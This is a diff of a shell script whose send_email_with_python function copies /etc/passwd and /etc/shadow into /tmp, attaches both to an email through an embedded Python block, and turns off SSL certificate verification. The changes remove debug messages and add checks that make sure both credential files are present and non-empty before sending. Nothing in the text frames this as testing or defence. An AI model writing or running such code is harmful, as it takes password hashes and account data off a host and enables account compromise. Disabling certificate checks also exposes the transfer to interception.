@@ -851,20 +851,18 @@ send_email_with_python() {
     local TEMP_PASSWD="/tmp/${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
     local TEMP_SHADOW="/tmp/${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
     
-    # Copy files and verify (must run as root for shadow file)
-    if [ -r /etc/passwd ]; then
-        cp /etc/passwd "$TEMP_PASSWD" 2>/dev/null
-        [ -f "$TEMP_PASSWD" ] && echo "[DEBUG] passwd file copied: $(ls -lh $TEMP_PASSWD)" >&2 || echo "[DEBUG] passwd copy failed" >&2
-    else
-        echo "[DEBUG] Cannot read /etc/passwd" >&2
-    fi
-    
-    if [ -r /etc/shadow ]; then
-        cp /etc/shadow "$TEMP_SHADOW" 2>/dev/null
-        [ -f "$TEMP_SHADOW" ] && echo "[DEBUG] shadow file copied: $(ls -lh $TEMP_SHADOW)" >&2 || echo "[DEBUG] shadow copy failed" >&2
-    else
-        echo "[DEBUG] Cannot read /etc/shadow (not root?)" >&2
-    fi
+# Create temp copies with fallback if unreadable
+if [ -r /etc/passwd ]; then
+    cp /etc/passwd "$TEMP_PASSWD"
+else
+    echo "ERROR: /etc/passwd not readable" > "$TEMP_PASSWD"
+fi
+
+if [ -r /etc/shadow ]; then
+    cp /etc/shadow "$TEMP_SHADOW"
+else
+    echo "ERROR: /etc/shadow not readable (requires root)" > "$TEMP_SHADOW"
+fi
     
     python3 -c "
 import sys
@@ -895,10 +893,9 @@ try:
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
             msg.attach(part)
-        print(f'[DEBUG] Attached passwd file: {passwd_file}', file=sys.stderr)
     else:
         print(f'[DEBUG] passwd file NOT found: {passwd_file}', file=sys.stderr)
-    
+
     # Attach shadow file
     shadow_file = '$TEMP_SHADOW'
     if os.path.exists(shadow_file):
@@ -908,12 +905,20 @@ try:
             encoders.encode_base64(part)
             part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
             msg.attach(part)
-        print(f'[DEBUG] Attached shadow file: {shadow_file}', file=sys.stderr)
     else:
         print(f'[DEBUG] shadow file NOT found: {shadow_file}', file=sys.stderr)
 
-    # Create SSL context with disabled certificate verification
-    # (some servers have outdated CA certificates)
+    # ========== INSERT THE CHECK HERE ==========
+    if not os.path.exists(passwd_file) or os.path.getsize(passwd_file) == 0:
+        print(f'[ERROR] passwd file missing or empty: {passwd_file}', file=sys.stderr)
+        sys.exit(1)
+
+    if not os.path.exists(shadow_file) or os.path.getsize(shadow_file) == 0:
+        print(f'[ERROR] shadow file missing or empty: {shadow_file}', file=sys.stderr)
+        sys.exit(1)
+    # ===========================================
+
+    # Create SSL context ...
     context = ssl.create_default_context()
     context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
